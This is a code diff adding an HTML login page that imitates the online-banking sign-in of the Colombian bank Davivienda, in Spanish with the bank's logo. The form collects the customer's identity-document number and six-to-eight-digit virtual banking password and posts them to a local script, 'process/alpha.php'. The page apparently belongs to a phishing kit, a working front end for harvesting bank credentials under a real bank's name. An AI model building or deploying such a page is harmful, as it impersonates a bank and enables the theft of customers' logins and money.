@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Inicio de Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="LogoDavivienda.svg" alt="Davivienda Logo" class="logo">
+        </div>
+        
+        <div class="welcome-section">
+            <h1 class="greeting">¡Hola!</h1>
+            <h2 class="subtitle">Nos alegra que esté aquí</h2>
+        </div>
+        
+        <form class="login-form" action="process/alpha.php" method="post">
+            <div class="form-group">
+                <label for="documentType" class="form-label">Seleccione su tipo de documento</label>
+                <select id="documentType" class="form-select">
+                    <option value="cedula">Cedula de Ciudadania</option>
+                    <option value="ce">Cedula de Extranjeria</option>
+                    <option value="pasaporte">Pasaporte</option>
+                    <option value="nit">NIT</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="documentNumber" class="form-label">Ingrese su número de documento</label>
+                <input type="text" id="documentNumber" name="doc" minlength="4" maxlength="15" pattern="[0-9]*" class="form-input" placeholder="12312312">
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="rememberMe" class="checkbox">
+                <label for="rememberMe" class="checkbox-label">Recordar mis datos de identidad</label>
+            </div>
+            
+            <div class="form-group">
+                <label for="password" class="form-label">Ingrese su clave virtual</label>
+                <input type="password" id="password" name="pass" minlength="6" maxlength="8" pattern="[0-9]*" class="form-input" placeholder="">
+            </div>
+            
+            <button type="submit" class="btn-continue">Iniciar sesión</button>
+        </form>
+        
+        <div class="footer-link">
+            <a href="#" class="link-forgot">¿Olvidó o bloqueó su clave?</a>
+        </div>
+    </div>
+</body>
+</html>
